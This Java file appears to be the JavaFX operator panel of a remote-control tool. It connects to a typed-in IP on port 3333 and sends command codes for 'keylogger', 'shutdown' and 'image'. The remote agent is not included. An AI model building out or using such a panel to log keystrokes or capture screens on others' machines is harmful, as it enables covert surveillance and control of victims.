package client;

import javafx.event.ActionEvent;
import javafx.fxml.FXML;
import javafx.fxml.FXMLLoader;
import javafx.scene.Node;
import javafx.scene.Parent;
import javafx.scene.Scene;
import javafx.scene.control.TextField;
import javafx.scene.layout.Pane;
import javafx.stage.Stage;

import java.io.*;
import java.net.*;
import java.net.Socket;
import java.util.Optional;

public class ClientController {

    @FXML
    private TextField textBox1;

    private Stage stage;
    private Scene scene;

    @FXML
    private Pane paneMain;

    private Parent root;

    private DataOutputStream dout;
    private int connected = 0;
    public void connect(ActionEvent event) throws IOException
    {
        String ip = textBox1.getText();
        Socket s = new Socket(ip, 3333);
        connected = 1;
        dout = new DataOutputStream(s.getOutputStream());
        paneMain.getChildren().clear();

    }

    public void clickedKeylogger(ActionEvent event) throws IOException
    {
        dout.write(1);
        dout.flush();
    }
    public void clickedShutdown(ActionEvent event) throws IOException
    {
        dout.write(2);
        dout.flush();
    }
    public void clickedImage(ActionEvent event) throws IOException
    {
        dout.write(3);
        dout.flush();
    }
}
